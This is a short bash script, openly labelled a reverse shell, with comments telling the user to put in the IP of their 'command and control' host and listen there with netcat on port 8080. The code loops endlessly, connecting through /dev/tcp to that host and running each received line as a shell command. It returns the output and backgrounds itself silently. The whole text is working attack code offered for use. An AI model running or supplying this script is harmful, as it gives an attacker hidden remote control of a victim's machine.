#hi, yeah... this is a bash reverse shell
#cheers, enjoy the day!

#Replace REPLACEME with the IP of the machine
#your "command and control" is listening on
#run on  your cnc something simple like:
#nc -vvvlp 8080

loop_de_loop(){

while true;
do
exec 5<>/dev/tcp/REPLACEME/8080  
cat <&5 | while read line; do $line 2>&5 >&5; done 

done 

}

le_fork(){
loop_de_loop > /dev/null 2>&1
}

le_fork&
